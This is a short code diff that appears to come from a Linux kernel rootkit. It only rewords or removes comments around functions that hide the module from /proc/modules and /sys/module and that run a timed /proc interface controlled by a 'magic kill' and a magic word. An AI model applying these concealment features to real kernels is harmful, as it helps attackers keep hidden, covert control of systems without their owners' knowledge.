@@ -266,7 +266,7 @@ static void kv_hide_mod(void) {
 }
 
 /*
- * Restore the module entries in
+ * Restore module entries in
  * /proc/modules and /sys/module/<module>/
  * After this function is called the best next
  * thing to do is to rmmod the module.
@@ -388,10 +388,6 @@ static int open_cb(struct inode *ino, struct file *fptr) {
     return single_open(fptr, proc_dummy_show, NULL);
 }
 
-/**
- * shows the magik word
- * it is not a problem since /proc/kovid has time out
- */
 static ssize_t _seq_read(struct file *fptr, char __user *buffer,
         size_t count, loff_t *ppos) {
     int len = 0;
@@ -423,7 +419,7 @@ static ssize_t _seq_read(struct file *fptr, char __user *buffer,
 
 /**
  * removes proc interface
- * after a while
+ * after a certain amount of time passes,
  * can be re-activated with magic kill
  * Important to have this as I dump
  * rmmod magic key on it so to unload
